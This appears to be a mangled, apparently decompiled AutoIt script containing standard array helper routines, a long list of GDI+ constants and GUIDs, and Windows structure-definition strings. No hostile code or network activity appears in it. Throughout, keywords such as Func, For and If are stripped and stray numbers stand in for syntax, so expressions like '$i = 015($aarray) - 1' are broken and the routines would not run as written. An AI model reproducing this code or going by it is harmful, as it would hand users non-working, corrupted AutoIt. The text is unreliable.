$velem = 0
$i = $ibase15($aarray) - 1
$idims = 15
$velem = $aarray[$i]

$velem = $aarray[$i][$icolumn]

$odictionary.item($velem)

($iflags, 1) = 15
$atemp = $odictionary.keys()
_arrayinsert($atemp, 0, $odictionary.count)
$atemp

$odictionary.keys()


_array1dtohistogram($aarray, $isizing = 100)
($aarray, 0) > 1534(1, 0, "")
$isizing = $isizing * 8
$t, $n, $imin = 0, $imax = 0, $ioffset = 0
$i = 015($aarray) - 1
$t = $aarray[$i]
$t = ($t) ? ($t) : 0
$t < $imin5$imin = $t
$t > $imax5$imax = $t

$irange = ((($imax - $imin) / 8)) * 8
$ispaceratio = 4
$i = 015($aarray) - 1
$t = $aarray[$i]
$t5
$n = ((($isizing * $t) / $irange) / 8)
$aarray[$i] = ""
$t > 05
$imin5
$ioffset = (((($isizing * $imin) / $irange) / 8) / 8 * $ispaceratio)
$aarray[$i] = __array_stringrepeat((32), $ioffset)


$imin <> $t5
$ioffset = (((($isizing * ($t - $imin)) / $irange) / 8) / 8 * $ispaceratio)
$aarray[$i] = __array_stringrepeat((32), $ioffset)


$aarray[$i] &= __array_stringrepeat((9608), ($n / 8))
$n = ($n, 8)
$n > 05$aarray[$i] &= (9608 + 8 - $n)
$aarray[$i] &= " " & $t

$aarray[$i] = ""


$aarray

__array_stringrepeat($sstring, $irepeatcount)
$irepeatcount = ($irepeatcount)
($sstring) < 12$irepeatcount <= 0534(1, 0, "")
$sresult = ""
$irepeatcount > 1
($irepeatcount, 1)5$sresult &= $sstring
$sstring &= $sstring
$irepeatcount = ($irepeatcount, 1)

$sstring & $sresult

__array_exeterinternal(36$avarray, $istart, $isize, $sdelim, 36$aidx, 36$aresult, 36$icount)
$istart == $isize - 15
$i = 015$isize - 1
$aresult[$icount] &= $avarray[$aidx[$i]] & $sdelim

$sdelim <> ""5$aresult[$icount] = ($aresult[$icount], 1)
$icount += 1

$itemp
$i = $istart15$isize - 1
$itemp = $aidx[$i]
$aidx[$i] = $aidx[$istart]
$aidx[$istart] = $itemp
__array_exeterinternal($avarray, $istart + 1, $isize, $sdelim, $aidx, $aresult, $icount)
$aidx[$istart] = $aidx[$i]
$aidx[$i] = $itemp



__array_combinations($in, $ir)
$i_total = 1
$i = $ir15116 - 1
$i_total *= ($in / $i)
$in -= 1

($i_total)

__array_getnext($in, $ir, 36$ileft, $itotal, 36$aidx)
$ileft == $itotal5
$ileft -= 1


$i = $ir - 1
$aidx[$i] == $in - $ir + $i
$i -= 1

$aidx[$i] += 1
$j = $i + 115$ir - 1
$aidx[$j] = $aidx[$i] + $j - $i

$ileft -= 1

0$gdip_dashcapflat = 0
0$gdip_dashcapround = 2
0$gdip_dashcaptriangle = 3
0$gdip_dashstylesolid = 0
0$gdip_dashstyledash = 1
0$gdip_dashstyledot = 2
0$gdip_dashstyledashdot = 3
0$gdip_dashstyledashdotdot = 4
0$gdip_dashstylecustom = 5
0$gdip_epgchrominancetable = "{F2E455DC-09B3-4316-8260-676ADA32481C}"
0$gdip_epgcolordepth = "{66087055-AD66-4C7C-9A18-38A2310B8337}"
0$gdip_epgcompression = "{E09D739D-CCD4-44EE-8EBA-3FBF8BE4FC58}"
0$gdip_epgluminancetable = "{EDB33BCE-0266-4A77-B904-27216099E717}"
0$gdip_epgquality = "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"
0$gdip_epgrendermethod = "{6D42C53A-229A-4825-8BB7-5C99E2B9A8B8}"
0$gdip_epgsaveflag = "{292266FC-AC40-47BF-8CFC-A85B89A655DE}"
0$gdip_epgscanmethod = "{3A4E2661-3109-4E56-8536-42C156E7DCFA}"
0$gdip_epgtransformation = "{8D0EB2D1-A58E-4EA8-AA14-108074B7B6F9}"
0$gdip_epgversion = "{24D18C76-814A-41A4-BF53-1C219CCCF797}"
0$gdip_eptbyte = 1
0$gdip_eptascii = 2
0$gdip_eptshort = 3
0$gdip_eptlong = 4
0$gdip_eptrational = 5
0$gdip_eptlongrange = 6
0$gdip_eptundefined = 7
0$gdip_eptrationalrange = 8
0$gdip_errok = 0
0$gdip_errgenericerror = 1
0$gdip_errinvalidparameter = 2
0$gdip_erroutofmemory = 3
0$gdip_errobjectbusy = 4
0$gdip_errinsufficientbuffer = 5
0$gdip_errnotimplemented = 6
0$gdip_errwin32error = 7
0$gdip_errwrongstate = 8
0$gdip_erraborted = 9
0$gdip_errfilenotfound = 10
0$gdip_errvalueoverflow = 11
0$gdip_erraccessdenied = 12
0$gdip_errunknownimageformat = 13
0$gdip_errfontfamilynotfound = 14
0$gdip_errfontstylenotfound = 15
0$gdip_errnottruetypefont = 16
0$gdip_errunsupportedgdiversion = 17
0$gdip_errgdiplusnotinitialized = 18
0$gdip_errpropertynotfound = 19
0$gdip_errpropertynotsupported = 20
0$gdip_evtcompressionlzw = 2
0$gdip_evtcompressionccitt3 = 3
0$gdip_evtcompressionccitt4 = 4
0$gdip_evtcompressionrle = 5
0$gdip_evtcompressionnone = 6
0$gdip_evttransformrotate90 = 13
0$gdip_evttransformrotate180 = 14
0$gdip_evttransformrotate270 = 15
0$gdip_evttransformfliphorizontal = 16
0$gdip_evttransformflipvertical = 17
0$gdip_evtmultiframe = 18
0$gdip_evtlastframe = 19
0$gdip_evtflush = 20
0$gdip_evtframedimensionpage = 23
0$gdip_icfencoder = 1
0$gdip_icfdecoder = 2
0$gdip_icfsupportbitmap = 4
0$gdip_icfsupportvector = 8
0$gdip_icfseekableencode = 16
0$gdip_icfblockingdecode = 32
0$gdip_icfbuiltin = 65536
0$gdip_icfsystem = 131072
0$gdip_icfuser = 262144
0$gdip_ilmread = 1
0$gdip_ilmwrite = 2
0$gdip_ilmuserinputbuf = 4
0$gdip_linecapflat = 0
0$gdip_linecapsquare = 1
0$gdip_linecapround = 2
0$gdip_linecaptriangle = 3
0$gdip_linecapnoanchor = 16
0$gdip_linecapsquareanchor = 17
0$gdip_linecaproundanchor = 18
0$gdip_linecapdiamondanchor = 19
0$gdip_linecaparrowanchor = 20
0$gdip_linecapcustom = 255
0$gdip_pxf01indexed = 196865
0$gdip_pxf04indexed = 197634
0$gdip_pxf08indexed = 198659
0$gdip_pxf16grayscale = 1052676
0$gdip_pxf16rgb555 = 135173
0$gdip_pxf16rgb565 = 135174
0$gdip_pxf16argb1555 = 397319
0$gdip_pxf24rgb = 137224
0$gdip_pxf32rgb = 139273
0$gdip_pxf32argb = 2498570
0$gdip_pxf32pargb = 925707
0$gdip_pxf48rgb = 1060876
0$gdip_pxf64argb = 3424269
0$gdip_pxf64pargb = 1720334
0$gdip_imageformat_undefined = "{B96B3CA9-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_memorybmp = "{B96B3CAA-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_bmp = "{B96B3CAB-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_emf = "{B96B3CAC-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_wmf = "{B96B3CAD-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_jpeg = "{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_png = "{B96B3CAF-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_gif = "{B96B3CB0-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_tiff = "{B96B3CB1-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_exif = "{B96B3CB2-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imageformat_icon = "{B96B3CB5-0728-11D3-9D7B-0000F81EF32E}"
0$gdip_imagetype_unknown = 0
0$gdip_imagetype_bitmap = 1
0$gdip_imagetype_metafile = 2
0$gdip_imageflags_none = 0
0$gdip_imageflags_scalable = 1
0$gdip_imageflags_hasalpha = 2
0$gdip_imageflags_hastranslucent = 4
0$gdip_imageflags_partiallyscalable = 8
0$gdip_imageflags_colorspace_rgb = 16
0$gdip_imageflags_colorspace_cmyk = 32
0$gdip_imageflags_colorspace_gray = 64
0$gdip_imageflags_colorspace_ycbcr = 128
0$gdip_imageflags_colorspace_ycck = 256
0$gdip_imageflags_hasrealdpi = 4096
0$gdip_imageflags_hasrealpixelsize = 8192
0$gdip_imageflags_readonly = 65536
0$gdip_imageflags_caching = 131072
0$gdip_smoothingmode_invalid = -1
0$gdip_smoothingmode_default = 0
0$gdip_smoothingmode_highspeed = 1
0$gdip_smoothingmode_highquality = 2
0$gdip_smoothingmode_none = 3
0$gdip_smoothingmode_antialias8x4 = 4
0$gdip_smoothingmode_antialias = $gdip_smoothingmode_antialias8x4
0$gdip_smoothingmode_antialias8x8 = 5
0$gdip_rlum = 0.3086
0$gdip_glum = 0.6094
0$gdip_blum = 0.082
0$gdip_interpolationmode_invalid = -1
0$gdip_interpolationmode_default = 0
0$gdip_interpolationmode_lowquality = 1
0$gdip_interpolationmode_highquality = 2
0$gdip_interpolationmode_bilinear = 3
0$gdip_interpolationmode_bicubic = 4
0$gdip_interpolationmode_nearestneighbor = 5
0$gdip_interpolationmode_highqualitybilinear = 6
0$gdip_interpolationmode_highqualitybicubic = 7
0$gdip_textrenderinghint_systemdefault = 0
0$gdip_textrenderinghint_singlebitperpixelgridfit = 1
0$gdip_textrenderinghint_singlebitperpixel = 2
0$gdip_textrenderinghint_antialiasgridfit = 3
0$gdip_textrenderinghint_antialias = 4
0$gdip_textrenderinghint_cleartypegridfit = 5
0$gdip_pixeloffsetmode_invalid = -1
0$gdip_pixeloffsetmode_default = 0
0$gdip_pixeloffsetmode_highspeed = 1
0$gdip_pixeloffsetmode_highquality = 2
0$gdip_pixeloffsetmode_none = 3
0$gdip_pixeloffsetmode_half = 4
0$gdip_pensetlinejoin_miter = 0
0$gdip_pensetlinejoin_bevel = 1
0$gdip_pensetlinejoin_round = 2
0$gdip_pensetlinejoin_miterclipped = 3
0$gdip_fillmodealternate = 0
0$gdip_fillmodewinding = 1
0$gdip_qualitymodeinvalid = -1
0$gdip_qualitymodedefault = 0
0$gdip_qualitymodelow = 1
0$gdip_qualitymodehigh = 2
0$gdip_compositingmodesourceover = 0
0$gdip_compositingmodesourcecopy = 1
0$gdip_compositingqualityinvalid = $gdip_qualitymodeinvalid
0$gdip_compositingqualitydefault = $gdip_qualitymodedefault
0$gdip_compositingqualityhighspeed = $gdip_qualitymodelow
0$gdip_compositingqualityhighquality = $gdip_qualitymodehigh
0$gdip_compositingqualitygammacorrected = 3
0$gdip_compositingqualityassumelinear = 4
0$gdip_hatchstyle_horizontal = 0
0$gdip_hatchstyle_vertical = 1
0$gdip_hatchstyle_forwarddiagonal = 2
0$gdip_hatchstyle_backwarddiagonal = 3
0$gdip_hatchstyle_cross = 4
0$gdip_hatchstyle_diagonalcross = 5
0$gdip_hatchstyle_05percent = 6
0$gdip_hatchstyle_10percent = 7
0$gdip_hatchstyle_20percent = 8
0$gdip_hatchstyle_25percent = 9
0$gdip_hatchstyle_30percent = 10
0$gdip_hatchstyle_40percent = 11
0$gdip_hatchstyle_50percent = 12
0$gdip_hatchstyle_60percent = 13
0$gdip_hatchstyle_70percent = 14
0$gdip_hatchstyle_75percent = 15
0$gdip_hatchstyle_80percent = 16
0$gdip_hatchstyle_90percent = 17
0$gdip_hatchstyle_lightdownwarddiagonal = 18
0$gdip_hatchstyle_lightupwarddiagonal = 19
0$gdip_hatchstyle_darkdownwarddiagonal = 20
0$gdip_hatchstyle_darkupwarddiagonal = 21
0$gdip_hatchstyle_widedownwarddiagonal = 22
0$gdip_hatchstyle_wideupwarddiagonal = 23
0$gdip_hatchstyle_lightvertical = 24
0$gdip_hatchstyle_lighthorizontal = 25
0$gdip_hatchstyle_narrowvertical = 26
0$gdip_hatchstyle_narrowhorizontal = 27
0$gdip_hatchstyle_darkvertical = 28
0$gdip_hatchstyle_darkhorizontal = 29
0$gdip_hatchstyle_dasheddownwarddiagonal = 30
0$gdip_hatchstyle_dashedupwarddiagonal = 31
0$gdip_hatchstyle_dashedhorizontal = 32
0$gdip_hatchstyle_dashedvertical = 33
0$gdip_hatchstyle_smallconfetti = 34
0$gdip_hatchstyle_largeconfetti = 35
0$gdip_hatchstyle_zigzag = 36
0$gdip_hatchstyle_wave = 37
0$gdip_hatchstyle_diagonalbrick = 38
0$gdip_hatchstyle_horizontalbrick = 39
0$gdip_hatchstyle_weave = 40
0$gdip_hatchstyle_plaid = 41
0$gdip_hatchstyle_divot = 42
0$gdip_hatchstyle_dottedgrid = 43
0$gdip_hatchstyle_dotteddiamond = 44
0$gdip_hatchstyle_shingle = 45
0$gdip_hatchstyle_trellis = 46
0$gdip_hatchstyle_sphere = 47
0$gdip_hatchstyle_smallgrid = 48
0$gdip_hatchstyle_smallcheckerboard = 49
0$gdip_hatchstyle_largecheckerboard = 50
0$gdip_hatchstyle_outlineddiamond = 51
0$gdip_hatchstyle_soliddiamond = 52
0$gdip_hatchstyle_total = 53
0$gdip_hatchstyle_largegrid = $gdip_hatchstyle_cross
0$gdip_hatchstyle_min = $gdip_hatchstyle_horizontal
0$gdip_hatchstyle_max = $gdip_hatchstyle_total - 1
0$gdip_blureffectguid = "{633C80A4-1843-482b-9EF2-BE2834C5FDD4}"
0$gdip_sharpeneffectguid = "{63CBF3EE-C526-402c-8F71-62C540BF5142}"
0$gdip_colormatrixeffectguid = "{718F2615-7933-40e3-A511-5F68FE14DD74}"
0$gdip_colorluteffectguid = "{A7CE72A9-0F7F-40d7-B3CC-D0C02D5C3212}"
0$gdip_brightnesscontrasteffectguid = "{D3A1DBE1-8EC4-4c17-9F4C-EA97AD1C343D}"
0$gdip_huesaturationlightnesseffectguid = "{8B2DD6C3-EB07-4d87-A5F0-7108E26A9C5F}"
0$gdip_levelseffectguid = "{99C354EC-2A31-4f3a-8C34-17A803B33A25}"
0$gdip_tinteffectguid = "{1077AF00-2848-4441-9489-44AD4C2D7A2C}"
0$gdip_colorbalanceeffectguid = "{537E597D-251E-48da-9664-29CA496B70F8}"
0$gdip_redeyecorrectioneffectguid = "{74D29D05-69A4-4266-9549-3CC52836B632}"
0$gdip_colorcurveeffectguid = "{DD6A0022-58E4-4a67-9D9B-D48EB881A53D}"
0$gdip_adjustexposure = 0
0$gdip_adjustdensity = 1
0$gdip_adjustcontrast = 2
0$gdip_adjusthighlight = 3
0$gdip_adjustshadow = 4
0$gdip_adjustmidtone = 5
0$gdip_adjustwhitesaturation = 6
0$gdip_adjustblacksaturation = 7
0$gdip_curvechannelall = 0
0$gdip_curvechannelred = 1
0$gdip_curvechannelgreen = 2
0$gdip_curvechannelblue = 3
0$gdip_palettetypecustom = 0
0$gdip_palettetypeoptimal = 1
0$gdip_palettetypefixedbw = 2
0$gdip_palettetypefixedhalftone8 = 3
0$gdip_palettetypefixedhalftone27 = 4
0$gdip_palettetypefixedhalftone64 = 5
0$gdip_palettetypefixedhalftone125 = 6
0$gdip_palettetypefixedhalftone216 = 7
0$gdip_palettetypefixedhalftone252 = 8
0$gdip_palettetypefixedhalftone256 = 9
0$gdip_paletteflagshasalpha = 1
0$gdip_paletteflagsgrayscale = 2
0$gdip_paletteflagshalftone = 4
0$gdip_dithertypenone = 0
0$gdip_dithertypesolid = 1
0$gdip_dithertypeordered4x4 = 2
0$gdip_dithertypeordered8x8 = 3
0$gdip_dithertypeordered16x16 = 4
0$gdip_dithertypeordered91x91 = 5
0$gdip_dithertypespiral4x4 = 6
0$gdip_dithertypespiral8x8 = 7
0$gdip_dithertypedualspiral4x4 = 8
0$gdip_dithertypedualspiral8x8 = 9
0$gdip_dithertypeerrordiffusion = 10
0$gdip_dithertypemax = 10
0$gdip_histogramformatargb = 0
0$gdip_histogramformatpargb = 1
0$gdip_histogramformatrgb = 2
0$gdip_histogramformatgray = 3
0$gdip_histogramformatb = 4
0$gdip_histogramformatg = 5
0$gdip_histogramformatr = 6
0$gdip_histogramformata = 7
0$gdip_textrenderinghintsystemdefault = 0
0$gdip_textrenderinghintsinglebitperpixelgridfit = 1
0$gdip_textrenderinghintsinglebitperpixel = 2
0$gdip_textrenderinghintantialiasgridfit = 3
0$gdip_textrenderinghintantialias = 4
0$gdip_textrenderinghintcleartypegridfit = 5
0$gdip_rotatenoneflipnone = 0
0$gdip_rotate90flipnone = 1
0$gdip_rotate180flipnone = 2
0$gdip_rotate270flipnone = 3
0$gdip_rotatenoneflipx = 4
0$gdip_rotate90flipx = 5
0$gdip_rotate180flipx = 6
0$gdip_rotate270flipx = 7
0$gdip_rotatenoneflipy = $gdip_rotate180flipx
0$gdip_rotate90flipy = $gdip_rotate270flipx
0$gdip_rotate180flipy = $gdip_rotatenoneflipx
0$gdip_rotate270flipy = $gdip_rotate90flipx
0$gdip_rotatenoneflipxy = $gdip_rotate180flipnone
0$gdip_rotate90flipxy = $gdip_rotate270flipnone
0$gdip_rotate270flipxy = $gdip_rotate90flipnone
0$tagpoint = "struct;long X;long Y;endstruct"
0$tagrect = "struct;long Left;long Top;long Right;long Bottom;endstruct"
0$tagsize = "struct;long X;long Y;endstruct"
0$tagmargins = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
0$tagfiletime = "struct;dword Lo;dword Hi;endstruct"
0$tagsystemtime = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
0$tagtime_zone_information = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
0$tagnmhdr = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
0$tagcomboboxexitem = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
0$tagnmcbedragbegin = $tagnmhdr & ";int ItemID;wchar szText[260]"
0$tagnmcbeendedit = $tagnmhdr & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
0$tagnmcomboboxex = $tagnmhdr & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
0$tagdtprange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
0$tagnmdatetimechange = $tagnmhdr & ";dword Flag;" & $tagsystemtime
0$tagnmdatetimeformat = $tagnmhdr & ";ptr Format;" & $tagsystemtime & ";ptr pDisplay;wchar Display[64]"
0$tagnmdatetimeformatquery = $tagnmhdr & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
0$tagnmdatetimekeydown = $tagnmhdr & ";int VirtKey;ptr Format;" & $tagsystemtime
0$tagnmdatetimestring = $tagnmhdr & ";ptr UserString;" & $tagsystemtime & ";dword Flags"
0$tageventlogrecord = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
0$taggdip_effectparams_blur = "float Radius; bool ExpandEdge"
0$taggdip_effectparams_brightnesscontrast = "int BrightnessLevel; int ContrastLevel"
0$taggdip_effectparams_colorbalance = "int CyanRed; int MagentaGreen; int YellowBlue"
0$taggdip_effectparams_colorcurve = "int Adjustment; int Channel; int AdjustValue"
0$taggdip_effectparams_colorlut = "byte LutB[256]; byte LutG[256]; byte LutR[256]; byte LutA[256]"
0$taggdip_effectparams_huesaturationlightness = "int HueLevel; int SaturationLevel; int LightnessLevel"
0$taggdip_effectparams_levels = "int Highlight; int Midtone; int Shadow"
0$taggdip_effectparams_redeyecorrection = "uint NumberOfAreas; ptr Areas"
0$taggdip_effectparams_sharpen = "float Radius; float Amount"
0$taggdip_effectparams_tint = "int Hue; int Amount"
0$taggdipbitmapdata = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
0$taggdipcolormatrix = "float m[25]"
0$taggdipencoderparam = "struct;byte GUID[16];ulong NumberOfValues;ulong Type;ptr Values;endstruct"
0$taggdipencoderparams = "uint Count;" & $taggdipencoderparam
0$taggdiprectf = "struct;float X;float Y;float Width;float Height;endstruct"
0$taggdipstartupinput = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
0$taggdipstartupoutput = "ptr HookProc;ptr UnhookProc"
0$taggdipimagecodecinfo = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
0$taggdippencoderparams = "uint Count;byte Params[1]"
0$taghditem = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
0$tagnmhddispinfo = $tagnmhdr & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
0$tagnmhdfilterbtnclick = $tagnmhdr & ";int Item;" & $tagrect
0$tagnmheader = $tagnmhdr & ";int Item;int Button;ptr pItem"
0$taggetipaddress = "byte Field4;byte Field3;byte Field2;byte Field1"
0$tagnmipaddress = $tagnmhdr & ";int Field;int Value"
0$taglvfindinfo = "struct;uint Flags;ptr Text;lparam Param;" & $tagpoint & ";uint Direction;endstruct"
0$taglvhittestinfo = $tagpoint & ";uint Flags;int Item;int SubItem;int iGroup"
0$taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
0$tagnmlistview = $tagnmhdr & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
0$tagnmlvcustomdraw = "struct;" & $tagnmhdr & ";dword dwDrawStage;handle hdc;" & $tagrect & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartId;int iStateId;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
0$tagnmlvdispinfo = $tagnmhdr & ";" & $taglvitem
0$tagnmlvfinditem = $tagnmhdr & ";int Start;" & $taglvfindinfo
0$tagnmlvgetinfotip = $tagnmhdr & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
0$tagnmitemactivate = $tagnmhdr & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $tagpoint & ";lparam lParam;uint KeyFlags"
0$tagnmlvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
0$tagnmlvscroll = $tagnmhdr & ";int DX;int DY"
0$tagmchittestinfo = "uint Size;" & $tagpoint & ";uint Hit;" & $tagsystemtime & ";" & $tagrect & ";int iOffset;int iRow;int iCol"
0$tagmcmonthrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
0$tagmcrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
0$tagmcselrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
0$tagnmdaystate = $tagnmhdr & ";" & $tagsystemtime & ";int DayState;ptr pDayState"
0$tagnmselchange = $tagnmhdr & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
0$tagnmobjectnotify = $tagnmhdr & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
0$tagnmtckeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
0$tagtvitem = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
0$tagtvitemex = "struct;" & $tagtvitem & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
0$tagnmtreeview = $tagnmhdr & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
0$tagnmtvcustomdraw = "struct;" & $tagnmhdr & ";dword DrawStage;handle HDC;" & $tagrect & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
0$tagnmtvdispinfo = $tagnmhdr & ";" & $tagtvitem
0$tagnmtvgetinfotip = $tagnmhdr & ";ptr Text;int TextMax;handle hItem;lparam lParam"
0$tagnmtvitemchange = $tagnmhdr & ";uint Changed;handle hItem;uint StateNew;uint StateOld;lparam lParam;"
0$tagtvhittestinfo = $tagpoint & ";uint Flags;handle Item"
0$tagnmtvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
0$tagnmmouse = $tagnmhdr & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $tagpoint & ";lparam HitInfo"
0$tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
0$tagimageinfo = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $tagrect
0$tagmenuinfo = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
0$tagmenuiteminfo = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
0$tagrebarbandinfo = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader" & ((@OSVersion = "WIN_XP") ? "" : ";" & $tagrect & ";uint uChevronState")
0$tagnmrebarautobreak = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
0$tagnmrbautosize = $tagnmhdr & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
0$tagnmrebar = $tagnmhdr & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
0$tagnmrebarchevron = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;" & $tagrect & ";lparam lParamNM"
0$tagnmrebarchildsize = $tagnmhdr & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
0$tagcolorscheme = "dword Size;dword BtnHighlight;dword BtnShadow"
0$tagnmtoolbar = $tagnmhdr & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $tagrect
0$tagnmtbhotitem = $tagnmhdr & ";int idOld;int idNew;dword dwFlags"
0$tagtbbutton = "int Bitmap;int Command;byte State;byte Style;dword_ptr Param;int_ptr String"
0$tagtbbuttoninfo = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
0$tagnetresource = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
0$tagoverlapped = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
0$tagopenfilename = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
0$tagbitmapinfoheader = "struct;dword biSize;long biWidth;long biHeight;word biPlanes;word biBitCount;" & "dword biCompression;dword biSizeImage;long biXPelsPerMeter;long biYPelsPerMeter;dword biClrUsed;dword biClrImportant;endstruct"
0$tagbitmapinfo = $tagbitmapinfoheader & ";dword biRGBQuad[1]"
0$tagblendfunction = "byte Op;byte Flags;byte Alpha;byte Format"
0$tagguid = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
0$tagwindowplacement = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
